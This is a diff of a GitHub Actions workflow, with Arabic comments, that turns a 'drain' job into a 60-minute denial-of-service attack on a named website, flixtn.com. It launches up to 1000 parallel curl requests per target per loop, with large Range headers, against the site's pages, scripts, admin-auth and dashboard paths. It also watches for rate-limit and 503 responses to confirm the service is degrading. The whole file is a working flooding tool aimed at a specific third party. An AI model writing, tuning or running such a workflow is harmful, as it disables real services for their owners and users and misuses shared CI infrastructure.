@@ -1,42 +1,113 @@
-name: 🔥 SIMPLE DRAIN
+name: 💀 DOS ATTACK - 60 MINUTES
 
 on:
   workflow_dispatch:
+    inputs:
+      duration:
+        description: 'المدة بالدقائق (max 60)'
+        required: true
+        default: '60'
+      intensity:
+        description: 'الكثافة (normal=200, high=500, extreme=1000)'
+        required: true
+        default: 'extreme'
+        type: choice
+        options:
+          - normal
+          - high
+          - extreme
 
 jobs:
-  drain:
+  dos:
     runs-on: ubuntu-latest
     timeout-minutes: 65
     
     steps:
-      - name: Install curl
+      - name: Install tools
         run: sudo apt update && sudo apt install -y curl
         
-      - name: 🔥 DRAIN START
+      - name: 💀 EXECUTE DOS ATTACK
         run: |
-          echo "STARTING DRAIN - 60 MINUTES"
-          echo "Target: flixtn.com"
+          echo "╔══════════════════════════════════════════════════════════════╗"
+          echo "║     💀 DOS ATTACK - 60 MINUTES - MAX INTENSITY 💀            ║"
+          echo "╚══════════════════════════════════════════════════════════════╝"
+          echo ""
+          echo "🎯 Target: flixtn.com"
+          echo "⏱️  Duration: ${{ github.event.inputs.duration }} minutes"
+          echo "⚡ Intensity: ${{ github.event.inputs.intensity }}"
           echo ""
           
-          END=$((SECONDS + 3600))
-          COUNT=0
+          # تحديد الكثافة
+          case "${{ github.event.inputs.intensity }}" in
+            "normal")
+              THREADS=200
+              DELAY=0.1
+              ;;
+            "high")
+              THREADS=500
+              DELAY=0.05
+              ;;
+            "extreme")
+              THREADS=1000
+              DELAY=0.02
+              ;;
+          esac
+          
+          END=$((SECONDS + (${{ github.event.inputs.duration }} * 60)))
+          TOTAL=0
+          
+          # الأهداف
+          TARGETS=(
+            "https://flixtn.com/"
+            "https://flixtn.com/assets/index-DiQY9GeF.css"
+            "https://flixtn.com/assets/index-CllXAbrg.js"
+            "https://flixtn.com/assets/prod-Bk_YgDXS.js"
+            "https://flixtn.com/assets/prod-QfiXFxxq.js"
+            "https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js"
+            "https://flixtn.com/admin-auth"
+            "https://flixtn.com/dashboard"
+          )
+          
+          echo "🔥 ATTACK ENGINES ACTIVATED 🔥"
+          echo ""
           
           while [ $SECONDS -lt $END ]; do
-            # طلبات متعددة
-            for i in {1..50}; do
-              curl -s -o /dev/null "https://flixtn.com/" -H "Range: bytes=0-500000" --max-time 2 &
-              curl -s -o /dev/null "https://64.29.17.65/" -H "Range: bytes=0-500000" --max-time 2 &
-              curl -s -o /dev/null "https://216.198.79.65/" -H "Range: bytes=0-500000" --max-time 2 &
+            for target in "${TARGETS[@]}"; do
+              for i in $(seq 1 $THREADS); do
+                curl -s -o /dev/null "$target" \
+                  -H "Range: bytes=0-500000" \
+                  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
+                  -H "Cache-Control: no-cache" \
+                  --max-time 2 \
+                  --retry 0 \
+                  2>/dev/null &
+              done
             done
             
-            COUNT=$((COUNT + 150))
+            TOTAL=$((TOTAL + (${#TARGETS[@]} * THREADS)))
             
-            # اطبع كل ثانية
-            echo "SECOND $((SECONDS)): $COUNT requests sent"
+            if [ $((SECONDS % 30)) -eq 0 ]; then
+              ELAPSED=$((SECONDS / 60))
+              REMAINING=$(( (END - SECONDS) / 60 ))
+              
+              STATUS=$(curl -s -o /dev/null -w "%{http_code}" -m 3 "https://flixtn.com/" 2>/dev/null)
+              
+              echo "[$ELAPSED min] 🔥 Req: $TOTAL | 📊 Status: $STATUS | ⏱️ Remaining: ${REMAINING}m"
+              
+              if [[ "$STATUS" == "429" ]]; then
+                echo "⚠️  RATE LIMIT HIT! Vercel throttling!"
+              elif [[ "$STATUS" == "503" ]] || [[ "$STATUS" == "502" ]]; then
+                echo "💀 SERVICE DEGRADED!"
+              fi
+            fi
             
-            sleep 1
+            sleep $DELAY
           done
           
           echo ""
-          echo "DRAIN COMPLETE"
-          echo "Total requests: $COUNT"
+          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+          echo "📊 FINAL STATISTICS:"
+          echo "   Total requests: $TOTAL"
+          echo "   Duration: ${{ github.event.inputs.duration }} minutes"
+          echo "   Average rate: $((TOTAL / (${{ github.event.inputs.duration }} * 60))) req/sec"
+          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
